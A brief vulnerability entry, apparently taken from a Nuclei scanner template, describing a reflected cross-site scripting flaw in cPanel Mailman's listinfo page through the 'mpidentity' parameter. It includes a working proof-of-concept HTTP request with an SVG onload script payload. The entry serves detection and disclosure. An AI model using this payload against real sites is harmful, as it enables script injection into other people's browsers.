# Vulnerability: cPanel Mailman - Cross-Site Scripting
**Classification:** CWE-80
**Source:** Nuclei Template (`cpanel-mailman-xss.yaml`)

## Description
cPanel Mailman listinfo reflects the `mpidentity` query parameter into the HTML response without proper output encoding, resulting in reflected cross-site scripting.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/mailman/listinfo?mpidentity=%3C/script%3E%3Csvg/onload=alert(document.domain)%3E
```

